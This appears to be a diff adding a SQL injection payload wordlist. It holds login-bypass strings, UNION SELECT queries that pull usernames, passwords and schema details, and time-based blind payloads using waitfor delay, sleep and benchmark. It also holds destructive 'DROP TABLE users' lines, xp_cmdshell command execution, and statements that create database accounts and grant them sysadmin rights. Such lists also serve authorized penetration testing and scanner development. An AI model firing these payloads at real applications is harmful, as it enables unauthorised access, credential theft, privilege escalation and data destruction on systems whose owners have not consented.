@@ -1,0 +1,212 @@
+'
+"
+;
+' OR '1'='1
+' UNION SELECT NULL, NULL, NULL --
+' AND 1=1 --
+' OR 'a'='a
+' AND 1=1 --
+' UNION SELECT username, password FROM users --
+" OR ""=""
+' OR 'x'='x'
+" OR "a"="a"
+' AND 1=1 -- 
+' UNION SELECT NULL, NULL, NULL, NULL --
+' ; DROP TABLE users --
+' OR 1=1#
+' AND 1=2 --
+" OR "" = ""
+' AND 1=1 --
+' OR 1=1#
+" OR ""=""
+' OR 'x' = 'x'
+' AND 1=1 --
+' UNION SELECT NULL, NULL, NULL --
+' OR '1'='1' --
+' OR 1=1 --
+' OR "1"="1"
+' -- 
+'/* 
+'; --
+' OR "a"="a" --
+' AND 1=1; --
+' UNION SELECT user(), database(), version()--
+' UNION SELECT NULL, NULL, NULL, NULL --
+' UNION SELECT table_name, column_name, null FROM information_schema.columns --
+' OR 1=1 --
+' OR 'a'='a'
+' AND 1=1 --
+" OR ""=""
+" OR "a"="a"
+'/* DROP TABLE users --
+'-- AND 1=1 --
+ waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /* 
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+') waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /* 
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+')) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /* 
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /* 
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /* 
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /* 
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /* 
+")))))) waitfor delay '0:0:20' --
+# you will need to customize/modify some of the values in the queries for best effect
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+'exec sp_addlogin 'name' , 'password' --
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' grant connect to name; grant resource to name; --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/ 
++		addition, concatenate (or space in url)
+||		(double pipe) concatenate
+%		wildcard attribute indicator
+@variable	local variable
+@@variable	global variable
+# Numeric
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1	
+' AND MID(VERSION(),1,1) = '5';
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+Finding the table name
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+Comments:
+#	    Hash comment
+/*  	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	    Backtick
+ and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+" and 0=benchmark(3000000,MD5(1))%20/*
+" and 0=benchmark(3000000,MD5(1))%20--
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+") and 0=benchmark(3000000,MD5(1))%20/*
+") and 0=benchmark(3000000,MD5(1))%20--
+") and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20%23
+")) and 0=benchmark(3000000,MD5(1))%20/*
+")) and 0=benchmark(3000000,MD5(1))%20--
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20--
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20--
+")))) and 0=benchmark(3000000,MD5(1))%20%23
